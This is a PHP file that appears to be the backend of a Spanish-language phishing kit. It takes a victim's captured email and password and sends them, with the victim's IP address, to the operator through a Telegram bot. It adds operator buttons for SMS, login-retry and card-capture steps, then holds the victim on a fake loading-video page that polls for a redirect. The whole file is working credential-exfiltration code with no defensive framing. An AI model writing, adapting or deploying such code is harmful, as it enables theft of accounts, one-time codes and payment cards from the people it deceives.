<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración global
include('../settings.php');

$userp = $_SERVER['REMOTE_ADDR'];
$usuario = $_SESSION['usuario'] ?? 'desconocido';

// Necesitamos al menos el correo en sesión y la contraseña por POST o en sesión
if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {

    // Obtener la contraseña desde la sesión o desde el POST
    $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

    // Enviar datos a Telegram
    $correo = $_SESSION['e'];
    $psswd = $passwordValue;

    $msg = "📧 NUEVO MAIL RECIBIDO\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "📩 Correo: $correo\n";
    $msg .= "🔑 Password: $psswd\n";
    $msg .= "🌐 IP: $userp\n";

    // Crear botones inline
    $botones = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
                ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
                ['text' => '💳 Card', 'callback_data' => "CARD|$usuario"],
                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
            ]
        ]
    ]);

    // Enviar a Telegram
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => $botones
    ]));

    unset($_SESSION['e']);
    unset($_SESSION['c']);
    $_SESSION['from_out'] = true;

    // Redirigir a pantalla de carga con video
    echo '<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .video-container {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        video {
            max-width: 60%;
            max-height: 60vh;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <video id="cargaVideo" autoplay muted playsinline>
            <source src="cargaout.MP4" type="video/mp4">
        </video>
    </div>
    <script>
        const video = document.getElementById("cargaVideo");
        
        // Cuando el video termine, recargar la página
        video.addEventListener("ended", function() {
            window.location.reload();
        });
        
        // Verificar acción de Telegram cada 2 segundos
        setInterval(function() {
            fetch("../check_status.php")
                .then(response => response.json())
                .then(data => {
                    if (data.status === "redirect") {
                        window.location.href = data.target;
                    }
                })
                .catch(error => console.log("Esperando acción..."));
        }, 2000);
    </script>
</body>
</html>';
    exit;
}
?>